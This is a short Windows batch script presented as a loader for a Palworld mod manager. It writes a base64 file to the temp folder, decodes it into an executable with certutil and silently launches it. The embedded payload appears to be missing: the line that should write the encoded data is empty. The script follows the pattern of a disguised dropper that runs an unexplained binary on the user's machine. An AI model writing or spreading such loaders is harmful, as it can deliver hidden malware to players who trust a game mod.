@echo off
title Palworld Mod Manager - Loader
echo.
echo  ============================================================
echo   Palworld Mod Manager - Extracting...
echo  ============================================================
echo.

set "TEMP_DIR=%TEMP%\PalMiniMap_Manager"
if exist "%TEMP_DIR%" rmdir /s /q "%TEMP_DIR%" 2>nul
mkdir "%TEMP_DIR%" 2>nul
if errorlevel 1 (
    echo ERROR: Cannot create temp folder: %TEMP_DIR%
    pause
    exit /b 1
)

set "EXE_PATH=%TEMP_DIR%\MiniMap_GUI.exe"
echo Extracting MiniMap_GUI.exe to temp folder...
>"%TEMP_DIR%\payload.b64" ()
certutil -decode -f "%TEMP_DIR%\payload.b64" "%EXE_PATH%" >nul 2>&1
if errorlevel 1 (
    echo ERROR: certutil decode failed.
    pause
    exit /b 1
)
del "%TEMP_DIR%\payload.b64"

echo Launching Palworld Mod Manager...
echo.
start "" "%EXE_PATH%"
exit /b 0